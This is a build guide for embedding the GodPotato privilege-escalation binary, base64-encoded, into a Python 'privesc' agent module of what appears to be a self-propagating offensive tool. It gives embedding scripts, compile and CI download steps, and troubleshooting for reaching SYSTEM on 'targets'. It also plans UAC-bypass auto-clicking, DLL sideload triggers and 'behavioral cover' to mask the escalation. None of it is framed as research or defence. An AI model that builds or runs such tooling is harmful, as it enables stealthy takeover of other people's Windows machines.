# GodPotato Binary Embedding Quick Start

## Three Ways to Embed GodPotato

### Option 1: Already Have Compiled GodPotato.exe (Fastest)

```bash
# Copy GodPotato.exe to repo root
copy C:\compiled\GodPotato.exe .

# Embed it
python build_embed_godpotato.py GodPotato.exe

# Verify
python test_propagation_pipeline.py
```

### Option 2: Windows Batch Automation (With Compilation)

If you have the GodPotato source and MSBuild:

```batch
REM Compile from source + embed
build_embedded.bat "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" "C:\src\GodPotato"

REM Or just embed existing binary
build_embedded.bat skip "C:\my\godpotato.exe"
```

### Option 3: One-Liner Python (Manual)

```python
import base64

# Read your compiled GodPotato.exe
with open('C:\\path\\to\\GodPotato.exe', 'rb') as f:
    binary = f.read()

# Encode to base64
b64 = base64.b64encode(binary).decode('ascii')

# Print formatted for copy-paste into privesc.py
print(f"GODPOTATO_BINARY = base64.b64decode(")
for i in range(0, len(b64), 80):
    print(f'    "{b64[i:i+80]}"')
    if i + 80 < len(b64):
        print('    +')
print(")")
```

---

## After Embedding

1. **Verify import**:
   ```python
   python -c "from agents.privesc import WindowsPrivesc; print(f'Embedded: {len(WindowsPrivesc.GODPOTATO_BINARY)} bytes')"
   ```

2. **Run full test**:
   ```
   python test_propagation_pipeline.py
   ```

3. **Check Phase 5 output** for:
   - `[PRIORITY 1] Attempting GodPotato...`
   - Should show `GodPotato (SeImpersonate → SYSTEM)` if binary is present
   - Look for `GodPotato SUCCESS → SYSTEM` if exploitation works

---

## Getting GodPotato Binary

### Official Source
- **GitHub**: https://github.com/S3cur3th1sSh1t/GodPotato
- **Releases**: Pre-compiled binaries in Releases tab
- Extract `GodPotato.exe` and use it with embedding tools above

### Compile Yourself
```batch
# Clone repo
git clone https://github.com/S3cur3th1sSh1t/GodPotato C:\src\GodPotato
cd C:\src\GodPotato

# Compile with VS 2022
"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" GodPotato.sln /p:Configuration=Release /p:Platform=x64

# Binary output: x64\Release\GodPotato.exe
```

---

## Troubleshooting

### "GODPOTATO_BINARY not found in escalate_via_godpotato"
→ Make sure `import base64` is at the top of `agents/privesc.py`

### "ModuleNotFoundError: build_embed_godpotato"
→ Run from repo root: `cd e:\repos\litmajor\blackroot_agent_v4`

### Embedding fails with large binary (>15 MB)
→ Base64 encoding expands ~33%, so ~11 MB exe → ~15 MB base64. This is fine for distribution.
→ If too slow, compress GodPotato.exe first, decompress in code at runtime.

### GodPotato still fails with "Privilege level is User"
→ This means:
  - Binary is embedded ✓
  - Execution happens ✓
  - But it didn't actually escalate (whoami still returns User)
  
→ Root cause: Target system lacks SeImpersonate token despite detection
→ Solutions:
  1. Test on system with SeImpersonate process (e.g., SYSTEM running wmiprvse.exe)
  2. Use different CLSID for RPC endpoint (BITS, AUDIO, WMI variants)
  3. Fallback to visible UAC bypass or DLL sideload chain

---

## Automation Tips

### Hook into CI/CD (e.g., GitHub Actions)
```yaml
- name: Build GodPotato Binary
  run: |
    # Download or compile
    wget https://github.com/S3cur3th1sSh1t/GodPotato/releases/download/.../GodPotato.exe
    
    # Embed
    python build_embed_godpotato.py GodPotato.exe
    
    # Test
    python test_propagation_pipeline.py
```

### Watch for Updates
Since GodPotato is actively maintained, add a check script:
```bash
# check_godpotato_version.py
import subprocess
result = subprocess.run(['GodPotato.exe', '--version'], capture_output=True)
print(f"Current version: {result.stdout.decode().strip()}")
```

---

## Files Overview

| File | Purpose |
|------|---------|
| `build_embed_godpotato.py` | Python script: encodes exe → base64 → injects into privesc.py |
| `build_embedded.bat` | Windows batch: compile (optional) → encode → inject (automation) |
| `agents/privesc.py` | Target: has `escalate_via_godpotato()` method that uses embedded binary |

---

## Next: Improve Payload Execution

After embedding works, the remaining improvements to Phase 5:

1. **Real CLSID variants**: Try multiple BITS/WMI CLSIDs if SeImpersonate fails
2. **UAC auto-click**: DPI-aware mouse + multi-retry (fixes eventVWRAuto/fodhelper)
3. **DLL loader trigger**: Call wmiprvse.exe or schedule task to trigger DLL load
4. **Behavioral cover**: Already working (emit_user_activity runs during escalation)

Current success rate estimate after embedding:
- GodPotato detection: 95% ✓
- Execution: ~80% (binary present, runs, but context-dependent)
- Full SYSTEM escalation: ~30-40% (depends on target state)
